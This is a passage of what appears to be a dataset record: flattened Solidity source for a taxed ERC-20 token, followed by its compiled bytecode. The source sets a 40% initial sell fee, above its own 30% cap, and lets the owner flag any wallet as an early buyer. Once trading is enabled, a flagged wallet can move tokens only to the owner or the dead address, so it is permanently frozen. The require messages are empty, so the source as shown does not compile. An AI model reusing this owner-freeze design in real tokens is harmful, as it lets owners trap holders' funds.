buyBurnFee = 0; buyTotalFees = buyOperationsFee + buyLiquidityFee + buyDevFee + buyBurnFee; sellOperationsFee = 40; sellLiquidityFee = 0; sellDevFee = 0; sellBurnFee = 0; sellTotalFees = sellOperationsFee + sellLiquidityFee + sellDevFee + sellBurnFee; _excludeFromMaxTransaction(newOwner, true); _excludeFromMaxTransaction(address(this), true); _excludeFromMaxTransaction(address(0xdead), true); excludeFromFees(newOwner, true); excludeFromFees(address(this), true); excludeFromFees(address(0xdead), true); operationsAddress = address(newOwner); devAddress = address(newOwner); _createInitialSupply(newOwner, totalSupply); transferOwnership(newOwner); } receive() external payable {} function enableTrading(uint256 deadBlocks) external onlyOwner { require(!tradingActive, ); tradingActive = true; swapEnabled = true; tradingActiveBlock = block.number; blockForPenaltyEnd = tradingActiveBlock + deadBlocks; emit EnabledTrading(); } function removeLimits() external onlyOwner { limitsInEffect = false; transferDelayEnabled = false; emit RemovedLimits(); } function manageBoughtEarly(address wallet, bool flag) external onlyOwner { boughtEarly[wallet] = flag; } function massManageBoughtEarly(address[] calldata wallets, bool flag) external onlyOwner { for(uint256 i = 0; i < wallets.length; i++){ boughtEarly[wallets[i]] = flag; } } function disableTransferDelay() external onlyOwner { transferDelayEnabled = false; } function updateMaxBuyAmount(uint256 newNum) external onlyOwner { require(newNum >= (totalSupply() * 2 / 1000)/1e18, ); maxBuyAmount = newNum * (10**18); emit UpdatedMaxBuyAmount(maxBuyAmount); } function updateMaxSellAmount(uint256 newNum) external onlyOwner { require(newNum >= (totalSupply() * 2 / 1000)/1e18, ); maxSellAmount = newNum * (10**18); emit UpdatedMaxSellAmount(maxSellAmount); } function updateMaxWalletAmount(uint256 newNum) external onlyOwner { require(newNum >= (totalSupply() * 3 / 1000)/1e18, ); maxWalletAmount = newNum * (10**18); emit UpdatedMaxWalletAmount(maxWalletAmount); } function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner { require(newAmount >= totalSupply() * 1 / 100000, ); require(newAmount <= totalSupply() * 1 / 1000, ); swapTokensAtAmount = newAmount; } function _excludeFromMaxTransaction(address updAds, bool isExcluded) private { _isExcludedMaxTransactionAmount[updAds] = isExcluded; emit MaxTransactionExclusion(updAds, isExcluded); } function excludeFromMaxTransaction(address updAds, bool isEx) external onlyOwner { if(!isEx){ require(updAds != lpPair, ); } _isExcludedMaxTransactionAmount[updAds] = isEx; } function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner { require(pair != lpPair, ); _setAutomatedMarketMakerPair(pair, value); emit SetAutomatedMarketMakerPair(pair, value); } function _setAutomatedMarketMakerPair(address pair, bool value) private { automatedMarketMakerPairs[pair] = value; _excludeFromMaxTransaction(pair, value); emit SetAutomatedMarketMakerPair(pair, value); } function updateBuyFees(uint256 _operationsFee, uint256 _liquidityFee, uint256 _devFee, uint256 _burnFee) external onlyOwner { buyOperationsFee = _operationsFee; buyLiquidityFee = _liquidityFee; buyDevFee = _devFee; buyBurnFee = _burnFee; buyTotalFees = buyOperationsFee + buyLiquidityFee + buyDevFee + buyBurnFee; require(buyTotalFees <= 15, ); } function updateSellFees(uint256 _operationsFee, uint256 _liquidityFee, uint256 _devFee, uint256 _burnFee) external onlyOwner { sellOperationsFee = _operationsFee; sellLiquidityFee = _liquidityFee; sellDevFee = _devFee; sellBurnFee = _burnFee; sellTotalFees = sellOperationsFee + sellLiquidityFee + sellDevFee + sellBurnFee; require(sellTotalFees <= 30, ); } function returnToNormalTax() external onlyOwner { sellOperationsFee = 3; sellLiquidityFee = 0; sellDevFee = 0; sellBurnFee = 0; sellTotalFees = sellOperationsFee + sellLiquidityFee + sellDevFee + sellBurnFee; require(sellTotalFees <= 30, ); buyOperationsFee = 3; buyLiquidityFee = 0; buyDevFee = 0; buyBurnFee = 0; buyTotalFees = buyOperationsFee + buyLiquidityFee + buyDevFee + buyBurnFee; require(buyTotalFees <= 15, ); } function excludeFromFees(address account, bool excluded) public onlyOwner { _isExcludedFromFees[account] = excluded; emit ExcludeFromFees(account, excluded); } function _transfer(address from, address to, uint256 amount) internal override { require(from != address(0), ); require(to != address(0), ); require(amount > 0, ); if(!tradingActive){ require(_isExcludedFromFees[from] || _isExcludedFromFees[to], ); } if(blockForPenaltyEnd > 0){ require(!boughtEarly[from] || to == owner() || to == address(0xdead), ); } if(limitsInEffect){ if (from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]){ if (transferDelayEnabled){ if (to != address(dexRouter) && to != address(lpPair)){ require(_holderLastTransferTimestamp[tx.origin] < block.number - 2 && _holderLastTransferTimestamp[to] < block.number - 2, ); _holderLastTransferTimestamp[tx.origin] = block.number; _holderLastTransferTimestamp[to] = block.number; } } if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) { require(amount <= maxBuyAmount, ); require(amount + balanceOf(to) <= maxWalletAmount, ); } else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) { require(amount <= maxSellAmount, ); } else if (!_isExcludedMaxTransactionAmount[to]){ require(amount + balanceOf(to) <= maxWalletAmount, ); } } } uint256 contractTokenBalance = balanceOf(address(this)); bool canSwap = contractTokenBalance >= swapTokensAtAmount; if(canSwap && swapEnabled && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) { swapping = true; swapBack(); swapping = false; } bool takeFee = true; if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) { takeFee = false; } uint256 fees = 0; if(takeFee){ if(earlyBuyPenaltyInEffect() && automatedMarketMakerPairs[from] && !automatedMarketMakerPairs[to] && buyTotalFees > 0){ if(!boughtEarly[to]){ boughtEarly[to] = true; botsCaught += 1; emit CaughtEarlyBuyer(to); } fees = amount * 99 / 100; tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees; tokensForOperations += fees * buyOperationsFee / buyTotalFees; tokensForDev += fees * buyDevFee / buyTotalFees; tokensForBurn += fees * buyBurnFee / buyTotalFees; } else if (automatedMarketMakerPairs[to] && sellTotalFees > 0){ fees = amount * sellTotalFees / 100; tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees; tokensForOperations += fees * sellOperationsFee / sellTotalFees; tokensForDev += fees * sellDevFee / sellTotalFees; tokensForBurn += fees * sellBurnFee / sellTotalFees; } else if(automatedMarketMakerPairs[from] && buyTotalFees > 0) { fees = amount * buyTotalFees / 100; tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees; tokensForOperations += fees * buyOperationsFee / buyTotalFees; tokensForDev += fees * buyDevFee / buyTotalFees; tokensForBurn += fees * buyBurnFee / buyTotalFees; } if(fees > 0){ super._transfer(from, address(this), fees); } amount -= fees; } super._transfer(from, to, amount); } function earlyBuyPenaltyInEffect() public view returns (bool){ return block.number < blockForPenaltyEnd; } function swapTokensForEth(uint256 tokenAmount) private { address[] memory path = new address[](2); path[0] = address(this); path[1] = dexRouter.WETH(); _approve(address(this), address(dexRouter), tokenAmount); dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private { _approve(address(this), address(dexRouter), tokenAmount); dexRouter.addLiquidityETH{value: ethAmount}( address(this), tokenAmount, 0, 0, address(0xdead), block.timestamp ); } function swapBack() private { if(tokensForBurn > 0 && balanceOf(address(this)) >= tokensForBurn) { _burn(address(this), tokensForBurn); } tokensForBurn = 0; uint256 contractBalance = balanceOf(address(this)); uint256 totalTokensToSwap = tokensForLiquidity + tokensForOperations + tokensForDev; if(contractBalance == 0 || totalTokensToSwap == 0) {return;} if(contractBalance > swapTokensAtAmount * 20){ contractBalance = swapTokensAtAmount * 20; } bool success; uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2; swapTokensForEth(contractBalance - liquidityTokens); uint256 ethBalance = address(this).balance; uint256 ethForLiquidity = ethBalance; uint256 ethForOperations = ethBalance * tokensForOperations / (totalTokensToSwap - (tokensForLiquidity/2)); uint256 ethForDev = ethBalance * tokensForDev / (totalTokensToSwap - (tokensForLiquidity/2)); ethForLiquidity -= ethForOperations + ethForDev; tokensForLiquidity = 0; tokensForOperations = 0; tokensForDev = 0; tokensForBurn = 0; if(liquidityTokens > 0 && ethForLiquidity > 0){ addLiquidity(liquidityTokens, ethForLiquidity); } (success,) = address(devAddress).call{value: ethForDev}(); (success,) = address(operationsAddress).call{value: address(this).balance}(); } function transferForeignToken(address _token, address _to) external onlyOwner returns (bool _sent) { require(_token != address(0), ); require(_token != address(this), ); uint256 _contractBalance = IERC20(_token).balanceOf(address(this)); _sent = IERC20(_token).transfer(_to, _contractBalance); emit TransferForeignToken(_token, _contractBalance); } function withdrawStuckETH() external onlyOwner { bool success; (success,) = address(msg.sender).call{value: address(this).balance}(); } function setOperationsAddress(address _operationsAddress) external onlyOwner { require(_operationsAddress != address(0), ); operationsAddress = payable(_operationsAddress); } function setDevAddress(address _devAddress) external onlyOwner { require(_devAddress != address(0), ); devAddress = payable(_devAddress); } function forceSwapBack() external onlyOwner { require(balanceOf(address(this)) >= swapTokensAtAmount, ); swapping = true; swapBack(); swapping = false; emit OwnerForcedSwapBack(block.timestamp); } function buyBackTokens(uint256 amountInWei) external onlyOwner { require(amountInWei <= 10 ether, ); address[] memory path = new address[](2); path[0] = dexRouter.WETH(); path[1] = address(this); dexRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountInWei}( 0, path, address(0xdead), block.timestamp ); emit BuyBackTriggered(amountInWei); }}",0x6080604052600436106103dd5760003560e01c806395d89b41116101fd578063d257b34f11610118578063e800dff7116100ab578063f2fde38b1161007a578063f2fde38b14610af7578063f5648a4f14610b17578063f637434214610b2c578063fb002c9714610b42578063fc155d1d14610b5857600080fd5b8063e800dff714610a96578063e884f26014610ab6578063ee40166e14610acb578063f11a24d314610ae157600080fd5b8063e2cd5fcd116100e7578063e2cd5fcd14610a35578063e2f4560514610a4a578063e71dc3f514610a60578063e7ad9fcd14610a7657600080fd5b8063d257b34f14610999578063d85ba063146109b9578063dc3f0d0f146109cf578063dd62ed3e146109ef57600080fd5b8063aa4bde2811610190578063c02466681161015f578063c02466681461091f578063c18bc1951461093f578063c876d0b91461095f578063d0d41fe11461097957600080fd5b8063aa4bde28146108a4578063adb873bd146108ba578063b62496f5146108d0578063bbc0c7421461090057600080fd5b8063a0d82dc5116101cc578063a0d82dc514610838578063a457c2d71461084e578063a62068ce1461086e578063a9059cbb1461088457600080fd5b806395d89b41146107d75780639a7a23d6146107ec5780639c3b4fdc1461080c5780639fccce321461082257600080fd5b80634f77f6c0116102f857806370a082311161028b57806382aa7c681161025a57806382aa7c68146107335780638366e79a1461075357806385ecfd281461077357806388e765ff146107a35780638da5cb5b146107b957600080fd5b806370a08231146106c9578063715018a6146106e9578063751039fc146106fe5780637571336a1461071357600080fd5b806366d602ae116102c757806366d602ae146106675780636a486a8e1461067d5780636b0a894c146106935780636ddd1713146106a957600080fd5b80634f77f6c01461060f57806351f205e41461062557806358a6d5311461063a5780635a139dd41461065157600080fd5b806323b872dd11610370578063395093511161033f5780633950935114610595578063452ed4f1146105b5578063499b8394146105d55780634a62bb65146105f557600080fd5b806323b872dd146105195780632be32b61146105395780632e6ed7ef14610559578063313ce5671461057957600080fd5b8063130a2c3c116103ac578063130a2c3c146104ac57806318160ddd146104ce5780631a8145bb146104ed5780631d7778561461050357600080fd5b806306fdde03146103e95780630758d92414610414578063095ea7b31461044c57806310d5de531461047c57600080fd5b366103e457005b600080fd5b3480156103f557600080fd5b506103fe610b78565b60405161040b91906135c8565b60405180910390f35b34801561042057600080fd5b50600954610434906001600160a01b031681565b6040516001600160a01b03909116815260200161040b565b34801561045857600080fd5b5061046c610467366004613635565b610c0a565b604051901515815260200161040b565b34801561048857600080fd5b5061046c610497366004613661565b60246020526000908152604090205460ff1681565b3480156104b857600080fd5b506104cc6104c7366004613693565b610c20565b005b3480156104da57600080fd5b506002545b60405190815260200161040b565b3480156104f957600080fd5b506104df60205481565b34801561050f57600080fd5b506104df60225481565b34801561052557600080fd5b5061046c610534366004613719565b610cca565b34801561054557600080fd5b506104cc61055436600461375a565b610d74565b34801561056557600080fd5b506104cc610574366004613773565b610e81565b34801561058557600080fd5b506040516012815260200161040b565b3480156105a157600080fd5b5061046c6105b0366004613635565b610f34565b3480156105c157600080fd5b50600a54610434906001600160a01b031681565b3480156105e157600080fd5b506104cc6105f0366004613661565b610f70565b34801561060157600080fd5b5060125461046c9060ff1681565b34801561061b57600080fd5b506104df601b5481565b34801561063157600080fd5b506104cc611021565b34801561064657600080fd5b50600f54431061046c565b34801561065d57600080fd5b506104df60165481565b34801561067357600080fd5b506104df60075481565b34801561068957600080fd5b506104df601a5481565b34801561069f57600080fd5b506104df60115481565b3480156106b557600080fd5b5060125461046c9062010000900460ff1681565b3480156106d557600080fd5b506104df6106e4366004613661565b61112a565b3480156106f557600080fd5b506104cc611145565b34801561070a57600080fd5b506104cc6111b9565b34801561071f57600080fd5b506104cc61072e3660046137a5565b611224565b34801561073f57600080fd5b506104cc61074e36600461375a565b6112ec565b34801561075f57600080fd5b5061046c61076e3660046137de565b6113bf565b34801561077f57600080fd5b5061046c61078e366004613661565b60106020526000908152604090205460ff1681565b3480156107af57600080fd5b506104df60065481565b3480156107c557600080fd5b506005546001600160a01b0316610434565b3480156107e357600080fd5b506103fe6115c8565b3480156107f857600080fd5b506104cc6108073660046137a5565b6115d7565b34801561081857600080fd5b506104df60185481565b34801561082e57600080fd5b506104df60215481565b34801561084457600080fd5b506104df601d5481565b34801561085a57600080fd5b5061046c610869366004613635565b6116cb565b34801561087a57600080fd5b506104df600f5481565b34801561089057600080fd5b5061046c61089f366004613635565b611764565b3480156108b057600080fd5b506104df60085481565b3480156108c657600080fd5b506104df601e5481565b3480156108dc57600080fd5b5061046c6108eb366004613661565b60256020526000908152604090205460ff1681565b34801561090c57600080fd5b5060125461046c90610100900460ff1681565b34801561092b57600080fd5b506104cc61093a3660046137a5565b611771565b34801561094b57600080fd5b506104cc61095a36600461375a565b6117fa565b34801561096b57600080fd5b5060145461046c9060ff1681565b34801561098557600080fd5b506104cc610994366004613661565b611903565b3480156109a557600080fd5b506104cc6109b436600461375a565b6119a5565b3480156109c557600080fd5b506104df60155481565b3480156109db57600080fd5b506104cc6109ea36600461375a565b611af0565b3480156109fb57600080fd5b506104df610a0a3660046137de565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b348015610a4157600080fd5b506104cc611bf7565b348015610a5657600080fd5b506104df600b5481565b348015610a6c57600080fd5b506104df60195481565b348015610a8257600080fd5b506104cc610a91366004613773565b611d41565b348015610aa257600080fd5b506104cc610ab13660046137a5565b611df4565b348015610ac257600080fd5b506104cc611e49565b348015610ad757600080fd5b506104df600e5481565b348015610aed57600080fd5b506104df60175481565b348015610b0357600080fd5b506104cc610b12366004613661565b611e7f565b348015610b2357600080fd5b506104cc611f6a565b348015610b3857600080fd5b506104df601c5481565b348015610b4e57600080fd5b506104df601f5481565b348015610b6457600080fd5b506104cc610b7336600461375a565b611fd6565b606060038054610b879061380c565b80601f0160208091040260200160405190810160405280929190818152602001828054610bb39061380c565b8015610c005780601f10610bd557610100808354040283529160200191610c00565b820191906000526020600020905b815481529060010190602001808311610be357829003601f168201915b5050505050905090565b6000610c1733848461221a565b50600192915050565b6005546001600160a01b03163314610c535760405162461bcd60e51b8152600401610c4a90613846565b60405180910390fd5b60005b82811015610cc4578160106000868685818110610c7557610c7561387b565b9050602002016020810190610c8a9190613661565b6001600160a01b031681526020810191909152604001600020805460ff191691151591909117905580610cbc816138a7565b915050610c56565b50505050565b6000610cd784848461233f565b6001600160a01b038416600090815260016020908152604080832033845290915290205482811015610d5c5760405162461bcd60e51b815260206004820152602860248201527f45524332303a207472616e7366657220616d6f756e74206578636565647320616044820152676c6c6f77616e636560c01b6064820152608401610c4a565b610d69853385840361221a565b506001949350505050565b6005546001600160a01b03163314610d9e5760405162461bcd60e51b8152600401610c4a90613846565b670de0b6b3a76400006103e8610db360025490565b610dbe9060026138c0565b610dc891906138df565b610dd291906138df565b811015610e335760405162461bcd60e51b815260206004820152602960248201527f43616e6e6f7420736574206d61782062757920616d6f756e74206c6f776572206044820152687468616e20302e322560b81b6064820152608401610c4a565b610e4581670de0b6b3a76400006138c0565b60068190556040519081527ffcc0366804aaa8dbf88a2924100c733b70dec8445957a5d5f8ff92898de41009906020015b60405180910390a150565b6005546001600160a01b03163314610eab5760405162461bcd60e51b8152600401610c4a90613846565b60168490556017839055601882905560198190558082610ecb8587613901565b610ed59190613901565b610edf9190613901565b6015819055600f1015610cc45760405162461bcd60e51b815260206004820152601d60248201527f4d757374206b656570206665657320617420313525206f72206c6573730000006044820152606401610c4a565b3360008181526001602090815260408083206001600160a01b03871684529091528120549091610c17918590610f6b908690613901565b61221a565b6005546001600160a01b03163314610f9a5760405162461bcd60e51b8152600401610c4a90613846565b6001600160a01b038116610fff5760405162461bcd60e51b815260206004820152602660248201527f5f6f7065726174696f6e734164647265737320616464726573732063616e6e6f60448201526507420626520360d41b6064820152608401610c4a565b600c80546001600160a01b0319166001600160a01b0392909216919091179055565b6005546001600160a01b0316331461104b5760405162461bcd60e51b8152600401610c4a90613846565b600b546110573061112a565b10156110cd576040805162461bcd60e51b81526020600482015260248101919091527f43616e206f6e6c792073776170207768656e20746f6b656e20616d6f756e742060448201527f6973206174206f7220686967686572207468616e207265737472696374696f6e6064820152608401610c4a565b600a805460ff60a01b1916600160a01b1790556110e8612e74565b600a805460ff60a01b191690556040514281527f1b56c383f4f48fc992e45667ea4eabae777b9cca68b516a9562d8cda78f1bb329060200160405180910390a1565b6001600160a01b031660009081526020819052604090205490565b6005546001600160a01b0316331461116f5760405162461bcd60e51b8152600401610c4a90613846565b6005546040516000916001600160a01b0316907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600580546001600160a01b0319169055565b6005546001600160a01b031633146111e35760405162461bcd60e51b8152600401610c4a90613846565b6012805460ff199081169091556014805490911690556040517fa4ffae85e880608d5d4365c2b682786545d136145537788e7e0940dff9f0b98c90600090a1565b6005546001600160a01b0316331461124e5760405162461bcd60e51b8152600401610c4a90613846565b806112c157600a546001600160a01b03908116908316036112c15760405162461bcd60e51b815260206004820152602760248201527f43616e6e6f742072656d6f766520756e697377617020706169722066726f6d2060448201526636b0bc103a3c3760c91b6064820152608401610c4a565b6001600160a01b03919091166000908152602460205260409020805460ff1916911515919091179055565b6005546001600160a01b031633146113165760405162461bcd60e51b8152600401610c4a90613846565b601254610100900460ff161561136e5760405162461bcd60e51b815260206004820152601760248201527f43616e6e6f74207265656e61626c652074726164696e670000000000000000006044820152606401610c4a565b6012805462ffff0019166201010017905543600e819055611390908290613901565b600f556040517fa56feb2d31b9a7424db0be063fd450863979c9e2382cf5110f869bd1ad361bb790600090a150565b6005546000906001600160a01b031633146113ec5760405162461bcd60e51b8152600401610c4a90613846565b6001600160a01b0383166114425760405162461bcd60e51b815260206004820152601a60248201527f5f746f6b656e20616464726573732063616e6e6f7420626520300000000000006044820152606401610c4a565b306001600160a01b0384160361149a5760405162461bcd60e51b815260206004820152601c60248201527f43616e2774207769746864726177206e617469766520746f6b656e73000000006044820152606401610c4a565b6040516370a0823160e01b81523060048201526000906001600160a01b038516906370a0823190602401602060405180830381865afa1580156114e1573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906115059190613919565b60405163a9059cbb60e01b81526001600160a01b038581166004830152602482018390529192509085169063a9059cbb906044016020604051808303816000875af1158015611558573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061157c9190613932565b604080516001600160a01b0387168152602081018490529193507fdeda980967fcead7b61e78ac46a4da14274af29e894d4d61e8b81ec38ab3e438910160405180910390a15092915050565b606060048054610b879061380c565b6005546001600160a01b031633146116015760405162461bcd60e51b8152600401610c4a90613846565b600a546001600160a01b03908116908316036116855760405162461bcd60e51b815260206004820152603960248201527f54686520706169722063616e6e6f742062652072656d6f7665642066726f6d2060448201527f6175746f6d617465644d61726b65744d616b65725061697273000000000000006064820152608401610c4a565b61168f82826130b3565b604051811515906001600160a01b038416907fffa9187bf1f18bf477bd0ea1bcbb64e93b6a98132473929edfce215cd9b16fab90600090a35050565b3360009081526001602090815260408083206001600160a01b03861684529091528120548281101561174d5760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b6064820152608401610c4a565b61175a338585840361221a565b5060019392505050565b6000610c1733848461233f565b6005546001600160a01b0316331461179b5760405162461bcd60e51b8152600401610c4a90613846565b6001600160a01b038216600081815260236020908152604091829020805460ff191685151590811790915591519182527f9d8f7706ea1113d1a167b526eca956215946dd36cc7df39eb16180222d8b5df7910160405180910390a25050565b6005546001600160a01b031633146118245760405162461bcd60e51b8152600401610c4a90613846565b670de0b6b3a76400006103e861183960025490565b6118449060036138c0565b61184e91906138df565b61185891906138df565b8110156118bc5760405162461bcd60e51b815260206004820152602c60248201527f43616e6e6f7420736574206d61782077616c6c657420616d6f756e74206c6f7760448201526b6572207468616e20302e332560a01b6064820152608401610c4a565b6118ce81670de0b6b3a76400006138c0565b60088190556040519081527fefc9add9a9b7382de284ef5ad69d8ea863e2680492b21a81948c2d5f04a442bc90602001610e76565b6005546001600160a01b0316331461192d5760405162461bcd60e51b8152600401610c4a90613846565b6001600160a01b0381166119835760405162461bcd60e51b815260206004820152601f60248201527f5f6465764164647265737320616464726573732063616e6e6f742062652030006044820152606401610c4a565b600d80546001600160a01b0319166001600160a01b0392909216919091179055565b6005546001600160a01b031633146119cf5760405162461bcd60e51b8152600401610c4a90613846565b620186a06119dc60025490565b6119e79060016138c0565b6119f191906138df565b811015611a5e5760405162461bcd60e51b815260206004820152603560248201527f5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e60448201527410181718181892903a37ba30b61039bab838363c9760591b6064820152608401610c4a565b6103e8611a6a60025490565b611a759060016138c0565b611a7f91906138df565b811115611aeb5760405162461bcd60e51b815260206004820152603460248201527f5377617020616d6f756e742063616e6e6f742062652068696768657220746861604482015273371018171892903a37ba30b61039bab838363c9760611b6064820152608401610c4a565b600b55565b6005546001600160a01b03163314611b1a5760405162461bcd60e51b8152600401610c4a90613846565b670de0b6b3a76400006103e8611b2f60025490565b611b3a9060026138c0565b611b4491906138df565b611b4e91906138df565b811015611bb05760405162461bcd60e51b815260206004820152602a60248201527f43616e6e6f7420736574206d61782073656c6c20616d6f756e74206c6f776572604482015269207468616e20302e322560b01b6064820152608401610c4a565b611bc281670de0b6b3a76400006138c0565b60078190556040519081527f53c4eb831d8cfeb750f1c62590d8cd30f4c6f0380d29a05caa09f0d92588560e90602001610e76565b6005546001600160a01b03163314611c215760405162461bcd60e51b8152600401610c4a90613846565b6003601b8190556000601c819055601d819055601e819055908190611c47908290613901565b611c519190613901565b611c5b9190613901565b601a819055601e1015611cb05760405162461bcd60e51b815260206004820152601d60248201527f4d757374206b656570206665657320617420333025206f72206c6573730000006044820152606401610c4a565b600360168190556000601781905560188190556019819055908190611cd6908290613901565b611ce09190613901565b611cea9190613901565b6015819055600f1015611d3f5760405162461bcd60e51b815260206004820152601d60248201527f4d757374206b656570206665657320617420313525206f72206c6573730000006044820152606401610c4a565b565b6005546001600160a01b03163314611d6b5760405162461bcd60e51b8152600401610c4a90613846565b601b849055601c839055601d829055601e8190558082611d8b8587613901565b611d959190613901565b611d9f9190613901565b601a819055601e1015610cc45760405162461bcd60e51b815260206004820152601d60248201527f4d757374206b656570206665657320617420333025206f72206c6573730000006044820152606401610c4a565b6005546001600160a01b03163314611e1e5760405162461bcd60e51b8152600401610c4a90613846565b6001600160a01b03919091166000908152601060205260409020805460ff1916911515919091179055565b6005546001600160a01b03163314611e735760405162461bcd60e51b8152600401610c4a90613846565b6014805460ff19169055565b6005546001600160a01b03163314611ea95760405162461bcd60e51b8152600401610c4a90613846565b6001600160a01b038116611f0e5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b6064820152608401610c4a565b6005546040516001600160a01b038084169216907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a3600580546001600160a01b0319166001600160a01b0392909216919091179055565b6005546001600160a01b03163314611f945760405162461bcd60e51b8152600401610c4a90613846565b604051600090339047908381818185875af1925050503d8060008114610cc4576040519150601f19603f3d011682016040523d82523d6000602084013e610cc4565b6005546001600160a01b031633146120005760405162461bcd60e51b8152600401610c4a90613846565b678ac7230489e8000081111561208e5760405162461bcd60e51b815260206004820152604760248201527f4d6179206e6f7420627579206d6f7265207468616e2031302045544820696e2060448201527f612073696e676c652062757920746f207265647563652073616e64776963682060648201526661747461636b7360c81b608482015260a401610c4a565b6040805160028082526060820183526000926020830190803683375050600954604080516315ab88c960e31b815290519394506001600160a01b039091169263ad5c4648925060048083019260209291908290030181865afa1580156120f8573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061211c919061394f565b8160008151811061212f5761212f61387b565b60200260200101906001600160a01b031690816001600160a01b03168152505030816001815181106121635761216361387b565b6001600160a01b03928316602091820292909201015260095460405163b6f9de9560e01b815291169063b6f9de959084906121ab90600090869061dead9042906004016139b0565b6000604051808303818588803b1580156121c457600080fd5b505af11580156121d8573d6000803e3d6000fd5b50505050507fa017c1567cfcdd2d750a8c01e39fe2a846bcebc293c7d078477014d6848205688260405161220e91815260200190565b60405180910390a15050565b6001600160a01b03831661227c5760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610c4a565b6001600160a01b0382166122dd5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610c4a565b6001600160a01b0383811660008181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92591015b60405180910390a3505050565b6001600160a01b0383166123655760405162461bcd60e51b8152600401610c4a906139e5565b6001600160a01b03821661238b5760405162461bcd60e51b8152600401610c4a90613a2a565b600081116123db5760405162461bcd60e51b815260206004820152601d60248201527f616d6f756e74206d7573742062652067726561746572207468616e20300000006044820152606401610c4a565b601254610100900460ff1661246e576001600160a01b03831660009081526023602052604090205460ff168061242957506001600160a01b03821660009081526023602052604090205460ff165b61246e5760405162461bcd60e51b81526020600482015260166024820152752a3930b234b7339034b9903737ba1030b1ba34bb329760511b6044820152606401610c4a565b600f5415612541576001600160a01b03831660009081526010602052604090205460ff1615806124ab57506005546001600160a01b038381169116145b806124c057506001600160a01b03821661dead145b6125415760405162461bcd60e51b815260206004820152604660248201527f426f74732063616e6e6f74207472616e7366657220746f6b656e7320696e206f60448201527f72206f75742065786365707420746f206f776e6572206f722064656164206164606482015265323932b9b99760d11b608482015260a401610c4a565b60125460ff161561293d576005546001600160a01b0384811691161480159061257857506005546001600160a01b03838116911614155b801561258c57506001600160a01b03821615155b80156125a357506001600160a01b03821661dead14155b80156125c857506001600160a01b03831660009081526023602052604090205460ff16155b80156125ed57506001600160a01b03821660009081526023602052604090205460ff16155b1561293d5760145460ff1615612706576009546001600160a01b038381169116148015906126295750600a546001600160a01b03838116911614155b1561270657612639600243613a6d565b32600090815260136020526040902054108015612677575061265c600243613a6d565b6001600160a01b038316600090815260136020526040902054105b6126e15760405162461bcd60e51b815260206004820152603560248201527f5f7472616e736665723a3a205472616e736665722044656c617920656e61626c60448201527432b21710102a393c9030b3b0b4b7103630ba32b91760591b6064820152608401610c4a565b3260009081526013602052604080822043908190556001600160a01b03851683529120555b6001600160a01b03831660009081526025602052604090205460ff16801561274757506001600160a01b03821660009081526024602052604090205460ff16155b15612813576006548111156127af5760405162461bcd60e51b815260206004820152602860248201527f427579207472616e7366657220616d6f756e742065786365656473207468652060448201526736b0bc10313abc9760c11b6064820152608401610c4a565b6008546127bb8361112a565b6127c59083613901565b111561280e5760405162461bcd60e51b815260206004820152601860248201527710d85b9b9bdd08115e18d95959081b585e081dd85b1b195d60421b6044820152606401610c4a565b61293d565b6001600160a01b03821660009081526025602052604090205460ff16801561285457506001600160a01b03831660009081526024602052604090205460ff16155b156128be5760075481111561280e5760405162461bcd60e51b815260206004820152602a60248201527f53656c6c207472616e7366657220616d6f756e742065786365656473207468656044820152691036b0bc1039b2b6361760b11b6064820152608401610c4a565b6001600160a01b03821660009081526024602052604090205460ff1661293d576008546128ea8361112a565b6128f49083613901565b111561293d5760405162461bcd60e51b815260206004820152601860248201527710d85b9b9bdd08115e18d95959081b585e081dd85b1b195d60421b6044820152606401610c4a565b60006129483061112a565b600b5490915081108015908190612967575060125462010000900460ff165b801561297d5750600a54600160a01b900460ff16155b80156129a257506001600160a01b03851660009081526025602052604090205460ff16155b80156129c757506001600160a01b03851660009081526023602052604090205460ff16155b80156129ec57506001600160a01b03841660009081526023602052604090205460ff16155b15612a1a57600a805460ff60a01b1916600160a01b179055612a0c612e74565b600a805460ff60a01b191690555b6001600160a01b03851660009081526023602052604090205460019060ff1680612a5c57506001600160a01b03851660009081526023602052604090205460ff165b15612a65575060005b60008115612e6057600f5443108015612a9657506001600160a01b03871660009081526025602052604090205460ff165b8015612abb57506001600160a01b03861660009081526025602052604090205460ff16155b8015612ac957506000601554115b15612c49576001600160a01b03861660009081526010602052604090205460ff16612b69576001600160a01b0386166000908152601060205260408120805460ff191660019081179091556011805491929091612b27908490613901565b90915550506040516001600160a01b03871681527f55678e47d0a699d3ab99b0184c4ff14f2246ba80522deb921aa0c8823578c44a9060200160405180910390a15b6064612b768660636138c0